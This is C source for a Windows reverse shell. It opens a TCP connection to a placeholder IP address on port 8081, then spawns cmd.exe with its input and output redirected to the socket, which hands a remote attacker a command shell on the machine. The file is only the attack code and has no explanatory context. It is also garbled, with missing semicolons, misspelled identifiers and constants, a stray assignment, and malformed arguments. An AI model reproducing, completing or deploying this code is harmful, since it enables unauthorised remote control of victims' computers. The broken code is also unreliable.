#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment (lib, "Ws2_32.lib")

int main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    Char RecvServer[512];
    int connection;
    char ip_addr [] = "$IP"
    int port = 8081

    
    WSAStartup(MAKEWORD(2,2) &wsa); // Initialzing WinSock
    shell = WSASocket(Af_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL, (unsigned int) NULL); //Creating TCP Socket

    shell=addr.sin_port = htons(port);
    shell_addr.sin_family = Af_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL); //Connecting to target server
    if (connection == SOCKET_ERROR)
    {
        printf("[!] Connection to target failed :(. Give it another shot.\n");
        exit(0)
    }


else 
{
    recv(shell, RecvServer, sizeof(RecvServer), 0);
    memset(&si, 0, sizeof(si));
    si.cb =sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); 
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // Pipe standard I/O and Err to socket
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, -, NULL, NULL, &si, &pi); // Spawning CMD
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); 
    CloseHandle(pi.hThread);
    memset(RecvServer, ), sizeof(RecvServer));

}


}